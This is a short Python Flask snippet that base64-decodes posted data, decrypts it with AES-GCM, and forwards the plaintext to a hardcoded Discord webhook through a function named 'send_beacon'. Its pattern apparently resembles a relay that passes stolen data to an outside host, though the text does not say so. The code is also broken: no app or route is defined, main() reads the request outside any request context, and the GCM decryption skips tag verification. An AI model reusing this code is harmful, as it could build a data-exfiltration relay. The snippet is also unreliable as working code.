import os, json, base64, requests
from flask import request, jsonify

def decrypt(ciphertext: bytes, key: bytes) -> str:
    from Crypto.Cipher import AES
    cipher = AES.new(key, AES.MODE_GCM, nonce=ciphertext[:16])
    return cipher.decrypt(ciphertext[16:]).decode()

def send_beacon(data: dict):
    webhook = "https://discord.com/api/webhooks/1234567890/ABC123"
    requests.post(webhook, json=data)

def main():
    if request.method == "POST":
        body = request.get_json()
        encrypted = base64.b64decode(body["data"])
        key = os.getenv("CRYPTO_KEY").encode()  # Set in Vercel env
        payload = decrypt(encrypted, key)
        send_beacon({"content": payload})

    return jsonify({"status": "ok"})

if __name__ == "__main__":
    main()
